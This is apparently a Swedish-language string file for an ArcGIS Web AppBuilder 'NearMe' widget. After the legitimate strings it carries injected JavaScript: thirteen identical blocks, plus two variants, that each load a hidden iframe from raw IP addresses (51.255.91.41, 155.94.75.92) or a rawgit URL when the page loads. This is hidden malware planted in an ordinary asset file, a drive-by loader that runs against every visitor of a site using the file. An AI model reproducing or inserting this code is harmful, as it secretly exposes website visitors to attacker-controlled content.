// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Mile",acronym:"mi"},kilometers:{displayText:"Kilometer",acronym:"km"},feet:{displayText:"Fot",acronym:"fot"},meters:{displayText:"Meter",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"S\u00f6k k\u00e4llinst\u00e4llningar",searchSourceSettingTitle:"S\u00f6k k\u00e4llinst\u00e4llningar",searchSourceSettingTitleHintText:"L\u00e4gg till och konfigurera geokodningstj\u00e4nster eller geoobjektslager som s\u00f6kk\u00e4llor. Dessa angivna k\u00e4llor avg\u00f6r vad som g\u00e5r att s\u00f6ka i s\u00f6krutan",
addSearchSourceLabel:"L\u00e4gg till s\u00f6kk\u00e4lla",featureLayerLabel:"geoobjektslager",geocoderLabel:"Geokodare",nameTitle:"Namn",generalSettingLabel:"Allm\u00e4n inst\u00e4llning",allPlaceholderLabel:"Platsh\u00e5llartext f\u00f6r s\u00f6kning i alla:",allPlaceholderHintText:"Tips: Ange text som ska visas som platsh\u00e5llare n\u00e4r du s\u00f6ker i alla lager och geokodare",generalSettingCheckboxLabel:"Visa popup f\u00f6r det hittade geoobjekt eller den hittade platsen",countryCode:"Lands- eller regionkoder",
countryCodeEg:"till exempel ",countryCodeHint:"Om du l\u00e4mnar det h\u00e4r v\u00e4rdet tomt sker s\u00f6kningen i alla l\u00e4nder och regioner",questionMark:"?",searchInCurrentMapExtent:"S\u00f6k bara i den aktuella kartutbredningen",zoomScale:"Zoomningsskala",locatorUrl:"Geokodarens URL",locatorName:"Geokodarens namn",locatorExample:"Exempel",locatorWarning:"Den h\u00e4r versionen av geokodningstj\u00e4nsten st\u00f6ds inte. Widgeten har st\u00f6d f\u00f6r geokodningstj\u00e4nsten 10.0 och h\u00f6gre.",
locatorTips:"F\u00f6rslag finns inte tillg\u00e4ngliga eftersom geokodningstj\u00e4nsten inte har st\u00f6d f\u00f6r f\u00f6rslagsfunktionen.",layerSource:"Lagerk\u00e4lla",setLayerSource:"Ange lagerk\u00e4lla",setGeocoderURL:"Ange URL till geokodare",searchLayerTips:"F\u00f6rslag finns inte tillg\u00e4ngliga eftersom geoobjektstj\u00e4nsten inte har st\u00f6d f\u00f6r pagineringsfunktionen.",placeholder:"Platsh\u00e5llartext",searchFields:"S\u00f6kf\u00e4lt",displayField:"Visa f\u00e4lt",exactMatch:"Exakt matchning",
maxSuggestions:"Maximalt antal f\u00f6rslag",maxResults:"Maximala resultat",enableLocalSearch:"Aktivera lokal s\u00f6kning",minScale:"Minimiskala",minScaleHint:"N\u00e4r kartans skala \u00e4r st\u00f6rre \u00e4n denna skala anv\u00e4nds lokal s\u00f6kning",radius:"Radie",radiusHint:"Anger radien f\u00f6r ett omr\u00e5de kring den aktuella kartans mitt som ska anv\u00e4ndas f\u00f6r att h\u00f6ja rangordningen f\u00f6r geokodningskandidater s\u00e5 att de kandidater som \u00e4r n\u00e4rmast platsen returneras f\u00f6rst",
meters:"Meter",setSearchFields:"Ange s\u00f6kf\u00e4lt",set:"Ange",fieldName:"Namn",invalidUrlTip:"URL:en ${URL} \u00e4r ogiltig eller g\u00e5r inte att \u00f6ppna."},searchSetting:{searchSettingTabTitle:"S\u00f6kinst\u00e4llningar",defaultBufferDistanceLabel:"Ange ett standardv\u00e4rde f\u00f6r buffertavst\u00e5nd",maxResultCountLabel:"Begr\u00e4nsa antalet resultat",maxResultCountHintLabel:"Tips: Ange det maximala antalet synliga resultat. V\u00e4rdet 1 returnerar det n\u00e4rmaste geoobjektet",
maxBufferDistanceLabel:"Ange maximalt buffertavst\u00e5nd",bufferDistanceUnitLabel:"Enheter f\u00f6r buffertavst\u00e5nd",defaultBufferHintLabel:"Tips: Ange standardv\u00e4rde f\u00f6r buffertreglaget",maxBufferHintLabel:"Tips: Ange maxv\u00e4rde f\u00f6r buffertreglaget",bufferUnitLabel:"Tips: Ange vilken enhet som ska anv\u00e4ndas n\u00e4r man skapar buffertar",selectGraphicLocationSymbol:"Adress- eller platssymbol",graphicLocationSymbolHintText:"Tips: Symbol f\u00f6r adresser som anv\u00e4ndarna s\u00f6kt efter eller platser som de klickat p\u00e5",
addressLocationPolygonHintText:"Tips: Symbol f\u00f6r genoms\u00f6kt polygonlager",popupTitleForPolygon:"V\u00e4lj polygon f\u00f6r vald adress",popupTitleForPolyline:"V\u00e4lj linje f\u00f6r vald adress",addressLocationPolylineHintText:"Tips: Symbol f\u00f6r genoms\u00f6kt polylinjelager",fontColorLabel:"V\u00e4lj teckensnittsf\u00e4rg i s\u00f6kresultaten",fontColorHintText:"Tips: Teckensnittsf\u00e4rg i s\u00f6kresultaten",zoomToSelectedFeature:"Zooma till det valda geoobjektet",zoomToSelectedFeatureHintText:"Tips: Zooma till det valda geoobjektet i st\u00e4llet f\u00f6r till bufferten",
intersectSearchLocation:"Returnera korsande polygoner",intersectSearchLocationHintText:"Tips: Returnera polygoner som inneh\u00e5ller den efters\u00f6kta platsen snarare \u00e4n polygoner i bufferten",enableProximitySearch:"Aktivera s\u00f6kning i n\u00e4rheten",enableProximitySearchHintText:"Tips: Aktivera f\u00f6rm\u00e5gan att s\u00f6ka efter platser i n\u00e4rheten av ett valt resultat",bufferVisibilityLabel:"Ange buffertens synlighet",bufferVisibilityHintText:"Tips: Bufferten kommer att visas p\u00e5 kartan",
bufferColorLabel:"Ange buffertsymbol",bufferColorHintText:"Tips: V\u00e4lj f\u00e4rg och transparens f\u00f6r bufferten",searchLayerResultLabel:"Rita bara resultat i det valda lagret",searchLayerResultHint:"Tips: Bara det valda lagret i s\u00f6kresultaten ritas upp p\u00e5 kartan",showToolToSelectLabel:"Ange plats-knapp",showToolToSelectHintText:"Tips: Tillhandah\u00e5ller en knapp f\u00f6r att ange platsen p\u00e5 kartan, i st\u00e4llet f\u00f6r att alltid ange plats n\u00e4r kartan klickas",geoDesicParamLabel:"Anv\u00e4nd geodetisk buffert",
geoDesicParamHintText:"Tips: Anv\u00e4nd geodetisk buffert i st\u00e4llet f\u00f6r euklidisk buffert (plan)"},layerSelector:{selectLayerLabel:"V\u00e4lj s\u00f6klager",layerSelectionHint:"Tips: Ange knappen Ange f\u00f6r att v\u00e4lja lager",addLayerButton:"Ange"},routeSetting:{routeSettingTabTitle:"Riktningsinst\u00e4llningar",routeServiceUrl:"Ruttj\u00e4nst",buttonSet:"Ange",routeServiceUrlHintText:"Tips: Klicka p\u00e5 \u00e2\u20ac\u02dcAnge\u00e2\u20ac\u2122 f\u00f6r att leta efter och v\u00e4lja en ruttj\u00e4nst",
directionLengthUnit:"L\u00e4ngdenheter f\u00f6r riktning",unitsForRouteHintText:"Tips: Anv\u00e4nds f\u00f6r att visa enheter f\u00f6r rutter",selectRouteSymbol:"V\u00e4lj symbol f\u00f6r visning av rutten",routeSymbolHintText:"Tips: Visade tidigare en linjesymbol f\u00f6r rutten",routingDisabledMsg:"Om du vill anv\u00e4nda rutter och v\u00e4gbeskrivningar m\u00e5ste du kontrollera att det har aktiverats f\u00f6r objektet i applikationsinst\u00e4llningarna."},symbologySetting:{symbologySettingTabTitle:"Symbologiinst\u00e4llningar",
addSymbologyBtnLabel:"L\u00e4gg till nya symboler",layerNameTitle:"Lagernamn",fieldTitle:"F\u00e4lt",valuesTitle:"V\u00e4rden",symbolTitle:"Symbol",actionsTitle:"\u00c5tg\u00e4rder",invalidConfigMsg:"Dubblettf\u00e4lt: ${fieldName} f\u00f6r lagret: ${layerName}"},filterSetting:{filterSettingTabTitle:"Filterinst\u00e4llningar",addTaskTip:"L\u00e4gg till ett eller flera filter i det markerade s\u00f6klagret/de markerade s\u00f6klagren och st\u00e4ll in parametrar f\u00f6r vart och ett.",enableMapFilter:"Ta bort det f\u00f6rinst\u00e4llda lagerfiltret fr\u00e5n kartan.",
newFilter:"Nytt filter",filterExpression:"Filteruttryck",layerDefaultSymbolTip:"Anv\u00e4nd standardsymbolen f\u00f6r lagret",uploadImage:"\u00d6verf\u00f6r en bild",selectLayerTip:"V\u00e4lj ett lager.",setTitleTip:"Ange en titel.",noTasksTip:"Inga filter har konfigurerats. Klicka p\u00e5 ${newFilter} om du vill l\u00e4gga till ett nytt.",collapseFiltersTip:"D\u00f6lj filteruttryck (om det finns n\u00e5gra) n\u00e4r widgeten \u00f6ppnas"},networkServiceChooser:{arcgislabel:"L\u00e4gg till fr\u00e5n ArcGIS Online",
serviceURLabel:"L\u00e4gg till tj\u00e4nst-URL",routeURL:"Rutt-URL",validateRouteURL:"Validera",exampleText:"Exempel",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Ange en giltig ruttj\u00e4nst.",rateLimitExceeded:"Hastighetsbegr\u00e4nsningen \u00f6verskreds. F\u00f6rs\u00f6k igen senare.",errorInvokingService:"Anv\u00e4ndarnamn eller l\u00f6senord \u00e4r felaktigt."},
errorStrings:{bufferErrorString:"Ange ett giltigt numeriskt v\u00e4rde.",selectLayerErrorString:"V\u00e4lj vilka lager du vill s\u00f6ka i.",invalidDefaultValue:"Standardv\u00e4rdet f\u00f6r buffertavst\u00e5nd m\u00e5ste vara ifyllt. Ange buffertavst\u00e5ndet",invalidMaximumValue:"Maxv\u00e4rdet f\u00f6r buffertavst\u00e5nd m\u00e5ste vara ifyllt. Ange buffertavst\u00e5ndet",defaultValueLessThanMax:"Ange standardv\u00e4rdet f\u00f6r buffertavst\u00e5nd, och t\u00e4nk p\u00e5 att det inte f\u00e5r \u00f6verskrida maxgr\u00e4nsen",
defaultBufferValueGreaterThanOne:"Standardv\u00e4rdet f\u00f6r buffertavst\u00e5nd f\u00e5r inte vara mindre \u00e4n 0",maximumBufferValueGreaterThanOne:"Ange ett maxv\u00e4rde f\u00f6r buffertavst\u00e5ndet som \u00e4r st\u00f6rre \u00e4n noll",invalidMaximumResultCountValue:"Ange ett giltigt v\u00e4rde f\u00f6r det maximala antalet resultat",invalidSearchSources:"Ogiltiga s\u00f6kk\u00e4llinst\u00e4llningar"},symbolPickerPreviewText:"F\u00f6rhandsgranska:",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});